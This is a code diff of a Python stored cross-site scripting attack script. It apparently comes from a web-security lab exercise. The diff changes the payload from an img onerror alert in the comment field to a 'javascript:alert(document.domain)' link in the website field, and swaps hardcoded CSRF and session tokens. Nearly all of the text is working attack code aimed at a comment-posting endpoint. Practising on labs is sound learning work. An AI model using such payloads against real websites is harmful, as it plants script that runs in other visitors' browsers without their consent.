@@ -6,7 +6,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def get_website_url():
     if len(argv) != 2:
-        print(f"[+] usage {argv[0]} <url>")
+        print(f"[+] usage {argv[0]}")
         print(f"[+] example {argv[0]} 'http://example.com'")
         exit(-1)
 
@@ -20,17 +20,17 @@ def get_website_url():
 def attack(url): 
     print("[+] Starting attack")
     posts_path = "/post/comment"
-    xss_payload = "<img src=1 onerror=\"alert('Stored XSS')\">"
+    xss_payload = "javascript:alert(document.domain)"
 
     params = {
-    "csrf"   : "NRotdFv0C2wYAJGrK6DQCa1ppc0zOrc8",
+    "csrf"   : "IMnPLNruVptMZHoItM1mWe0JjhNwwy2A",
     "postId" : 2,
-    "comment": xss_payload,
+    "comment": "Stored XSS",
     "name"   : "hacker",
     "email"  : "hacker@hack.com",
-    "website": ""
+    "website": xss_payload
     }
-    cookie = {"session" : "HcEKooMnOeCpRqhO5CBsLQ6GC3378czT"}
+    cookie = {"session" : "Cm4CMtHn9dnzJV6dKLGbg6S2UD69sTuK"}
 
     print(f"[+] sending xss payload : {xss_payload}")
 
